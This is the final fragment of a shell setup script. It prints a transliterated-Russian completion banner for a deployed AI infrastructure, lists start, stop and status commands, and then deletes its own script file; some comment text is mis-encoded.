    echo ""; echo_t "======================================================================="; echo_t "  ‚úì AI-INFRASTRUKTURA RAZVERNUTA"; echo_t "  Zaversheno: $(date '+%Y-%m-%d %H:%M:%S')"; echo_t "======================================================================="; echo ""
    echo_t "Dostupnye komandy:"; echo_t "  start-ai   - Zapusk AI sluzhb"; echo_t "  stop-ai    - Ostanovka AI sluzhb"; echo_t "  status-ai  - Proverka statusa AI sluzhb"; echo ""
    echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Udalenie skripta..."; sleep 2; rm -f -- "$0"; exit 0
}

#==============================================================================
# –ó–ê–ü–£–°–ö –ì–õ–ê–í–ù–û–ô –§–£–ù–ö–¶–ò–ò
#==============================================================================
main "$@"
